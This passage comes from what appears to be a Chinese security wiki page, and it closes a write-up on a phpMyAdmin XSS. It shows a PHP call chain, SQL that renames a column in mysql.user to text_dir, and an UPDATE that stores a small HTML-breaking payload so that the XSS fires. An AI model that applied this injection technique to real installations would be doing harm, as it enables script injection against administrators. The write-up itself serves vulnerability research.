<div class="codehilite"><pre><span></span><code><span class="o">$</span><span class="nt">response</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nt">Response</span><span class="p">::</span><span class="nd">getInstance</span><span class="o">();</span>
<span class="o">$</span><span class="nt">header</span><span class="w">   </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="nt">response-</span><span class="o">&gt;</span><span class="nt">getHeader</span><span class="o">();</span>
<span class="o">$</span><span class="nt">scripts</span><span class="w">  </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="nt">header-</span><span class="o">&gt;</span><span class="nt">getScripts</span><span class="o">();</span>
</code></pre></div>

<p>拥有以上调用链后，只需要控制$GLOBAS的键为text_dir,值为XSS
payload即可，进入mysql库，执行以下sql语句修改列名xz为text_dir，并修改数据为XSS
Payload。</p>
<div class="codehilite"><pre><span></span><code><span class="k">ALTER</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="n n-Quoted">`user`</span><span class="w"> </span><span class="k">CHANGE</span><span class="w"> </span><span class="n n-Quoted">`xz`</span><span class="w"> </span><span class="n n-Quoted">`text_dir`</span><span class="w"> </span><span class="kt">VARCHAR</span><span class="p">(</span><span class="mi">255</span><span class="p">)</span><span class="w"> </span><span class="k">CHARACTER</span><span class="w"> </span><span class="k">SET</span><span class="w"> </span><span class="n">utf8</span><span class="w"> </span><span class="k">COLLATE</span><span class="w"> </span><span class="n">utf8_bin</span><span class="w"> </span><span class="no">NULL</span><span class="w"> </span><span class="k">DEFAULT</span><span class="w"> </span><span class="no">NULL</span><span class="p">;</span>
<span class="k">UPDATE</span><span class="w"> </span><span class="n n-Quoted">`user`</span><span class="w"> </span><span class="k">SET</span><span class="w"> </span><span class="n n-Quoted">`text_dir`</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;</span><span class="se">\&quot;</span><span class="s1">&gt;&lt;img src&gt;&lt;option dir=</span><span class="se">\&quot;</span><span class="s1">&#39;</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n n-Quoted">`user`</span><span class="p">.</span><span class="n n-Quoted">`Host`</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;127.0.0.1&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n n-Quoted">`user`</span><span class="p">.</span><span class="n n-Quoted">`User`</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;test&#39;</span><span class="p">;</span>
</code></pre></div>

<p>构造https://wiki.0-sec.org/img
src=\"<a href="https://wiki.0-sec.org/img/69c5e770161c4eaeb6d839977209edf2.png">https://wiki.0-sec.org/img/69c5e770161c4eaeb6d839977209edf2.png</a>\"
alt=\"3.png\" class=\"large\" onclick=\"window.open(this.src)\" /&gt;成功触发XSS</p>
<h2 id="_5">参考链接<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h2>
<blockquote>
<p><a href="https://xz.aliyun.com/t/7797">https://xz.aliyun.com/t/7797</a></p>
</blockquote>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../Phpmyadmin%20setup%E9%A1%B5%E9%9D%A2%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E7%9A%84%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF%E6%95%B4%E5%90%88/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../Phpmyadmin%20setup%E9%A1%B5%E9%9D%A2%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E7%9A%84%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF%E6%95%B4%E5%90%88/" class="btn btn-xs btn-link">
        Phpmyadmin setup页面配置不当的利用姿势整合
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../Phpcms/%EF%BC%88CVE-2018-19127%EF%BC%89Phpcms2008%20Type.php%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../Phpcms/%EF%BC%88CVE-2018-19127%EF%BC%89Phpcms2008%20Type.php%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        （CVE-2018-19127）Phpcms2008 Type.php代码注入漏洞
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>